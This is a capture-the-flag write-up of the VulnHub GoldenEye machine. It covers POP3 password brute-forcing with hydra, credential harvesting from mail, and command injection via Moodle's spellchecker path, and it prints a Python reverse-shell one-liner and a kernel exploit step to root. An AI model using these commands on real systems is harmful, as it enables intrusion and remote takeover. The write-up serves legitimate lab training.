---
layout: post
title:	"Goldeneye Writeup"
date:	2018-07-22 03:01:00
categories:
    - writeups
tags:
    - ctf
    - boot2root
    - vulnhub
---
<head>
	<title> Goldeneye Writeup | Vulnhub </title>
</head>

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/logo.png)

## i. Port Scan

Using unicornscan to scan all TCP ports:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/ports.png)

~~~
$ unicornscan -Iv -r 160 -mT 10.0.2.10:a

If you are unsure of what the command does, refer to my other writeup which explains it in more detail:
https://ch4n3l.github.io/writeups/blacklight/
~~~

`Ports 80 (http), 25 (smtp), 55006 (unknown) & 55007 (unknown) found. `

## ii. Enumeration

Starting off with port 80, we browse to the host and are presented with:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/http.png)

Navigating to `/sev-home`:

We are presented with basic authentication. 

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/basic.png)

If we look at the source of the index, we see there is a javascript file: `terminal.js`

Navigating to the file, we see a comment:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/comment.png)

~~~
[insert message here]
~~~

The password looks like it is encoded in HTML.

We can use Burp to decode the string:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/decode.png)

We now have credentials, `boris:InvincibleHack3r`

Attempting to use the credentials for /sev-home/:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/access.png)

We are able to gain access.

sev-home seems tobe a landing page which has a couple hints:

Hint #1: 
~~~ 
Please email a qualified GNO supervisor to receive the online GoldenEye Operators Training to become an Administrator of the GoldenEye system 
~~~

which is followed up by:

Hint #2: 
~~~ 
Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port
~~~


Running a service detection scan using nmap on the unknown ports (55006 & 55007) we found earlier:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/nmap.png)

Looks like ports 55006 and 55007 was the mail server that Hint #2 was talking about.

If we look at the bottom of the source for /sev-home, we also see qualified operators.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/operators.png)

After going millions of rabbit holes, we can try cracking the pop3 accounts for the operators.

` ** Note: The password is not in rockyou.txt, which is very annoying`
~~~
I am going to use the `fasttrack.txt` wordlist which contains the password.
https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/fasttrack/wordlist.txt
~~~

Attempting to crack boris account using hydra:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/hydra.png)

~~~
$ hydra -l boris -P fasttrack.txt -f 10.0.2.10 -s 55007 pop3

-l = username
-P = password list
-f = finish when password is found
-s = custom port
pop3 = service to crack
~~~

boris' account cracked:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/boriscracked.png)

We can now connect to pop3 and login using netcat:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/pop3login.png)

~~~
USER [username]
PASS [password]

For a full list of pop3 commands see: https://www.electrictoolbox.com/article/networking/pop3-commands/
~~~

Now that we are authenticated, we can use `LIST` to list the messages and `RETR {#}` to read the message:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/list.png)

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/retr.png)

` Note:  I have more messages because of a rabbit hole. `

The only message of interest was the one above. (Still doesn't give us any information)

At first, I thought there was a file attached to the e-mail, so I setup Thunderbird and connected to the pop3 server but it turned out to be a rabbit hole...

Let's move onto Natalya:

Cracking pop3 account:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/natalyacracked.png)

The second e-mail seems to contain very interesting information:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/secondemail.png)

We get credentials `xenia:RCP90rulez!`, and a new hidden directory.

As the e-mail says, we need to configure our /etc/hosts, or the virtual host will not work.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/error.png)

Updating /etc/hosts:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/hosts.png)

~~~
Use your text editor of choice, and open up /etc/hosts

Following the default format, IP {tab} Hostname 

/etc/hosts essentially works as a local DNS

Read more: http://bencane.com/2013/10/29/managing-dns-locally-with-etchosts/
~~~

Now we can try to browse to `http://severnaya-station.com/gnocertdir`

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/moodle.png)

It seems that the software running on the Web Server is Moodle. If we look for any exploits, we see there is a bunch but each for a different version.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/moodleploits.png)

Logging in as Xenia and enumerating Moodle:

See courses (Introduction to GoldenEye):

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/courses.png)

Though it seems like we cannot see what the course contains (as we are not enrolled):

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/enrolled.png)

Looking at messages, we can see a message from Dr Doak, which contains a hint:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/doakmessage.png)

The hint being his e-mail username, which led me to try cracking his email:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/doakcracked.png)

Reading his messages, we find:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/doakcredentials.png)

New credentials, `dr_doak:4England!`

After logging into moodle using his credentials.

Enumerating once again, we stumble across private files:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/privatefiles.png)

Reading `s3cret.txt`

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/s3cret.png)

~~~
s3cret.txt
~~~

Navigating to `/dir007key/for-007.jpg`, we are presented with an image:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/drdoak.png)

Image doesn't really seem interesting, downloading the image and running `strings` to see if there is any hidden text in the image:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/strings.png)

We find what seems like to be a base64 encoded string, decoding the string:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/base64.png)

`xWinter1995x!` looks like a password. Based off the note, we can confirm it is.

Trying to login using `admin:xWinter1995x!`

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/admin.png)

Great we now have administration rights. After poking around in the admin section, there is a area which displays information about the web software + server information.

In Environment, we are presented with the version:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/version.png)

After trying some exploits, and not having any luck. I poked around a bit more, and found System Paths.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/systempaths.png)

## iii. Reverse Shell

It seemed that this was the system path for the spellchecker. Which meant, whenever the spellchecker would be called it would execute this command to activate the spellchecker.

I tried replacing the path to aspell with a python reverse shell.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/aspellpath.png)

~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~

Then I enumerated Moodle some more and found a location where I can post. (Under blogs)

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/blog.png)

Nothing happened, I didn't get a shell back. I then read the source code of the Metasploit exploit and realized this exploit was doing the same thing I was doing, a great coincidence. 

I then read the exploit some more, and I found I missed changing the text editor which would use aspell.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/metasploit.png)

The exploit is making a POST request to `editorsettingstinymce` and changing the text editor to `PSpellShell`
(The default was Google Spell), updating the settings:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/settings.png)

Now retrying the blog post:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/shell.png)

We get a shell!

After spawning a TTY shell:
`python -c 'import pty;pty.spawn("/bin/bash")'`

Enumerating the Kernel & Operating System:

~~~
$ uname -a
$ cat /etc/*release
~~~

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/kernel.png)

The kernel version stands out to me because 2014 is a bit old.

## iv. Privilege Escalation

Looking for exploits that match the kernel:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/kernel-searchsploit.png)

After compiling the exploit on our local machine, and transferring to the host. 

We run the exploit:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/exploit.png)

An error has occurred: `gcc: not found`

That is because gcc is not installed on the machine, but cc is.

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/gccvscc.png)

In the exploit's source code on `line 143`, we see:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/gcc.png)

Change it to use cc:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/cc.png)

After recompiling the exploit, and uploading to the host, we run it once again:

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/privesc.png)

Looks like the exploit worked, and we are now root.

`/root/.flag.txt`

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/flag.png)

## v. Conclusion

![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/webflag.png)

This is one of my favorite boxes so far. The box is challenging, but rewarding.

I enjoyed the rabbit holes in this box, because it helped show light to topics I wasn't familiar with.

The only "issue" I had with this box, was with the wordlist. Trying to crack using `rockyou.txt` failed, and I tried a couple other wordlists such as SecLists, but with no luck. This actually threw me down a different hole.


Attempt the box: https://www.vulnhub.com/entry/goldeneye-1,240/

~~~
Sources / Links:

[0]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[1]: https://www.vulnhub.com/entry/goldeneye-1,240/
~~~




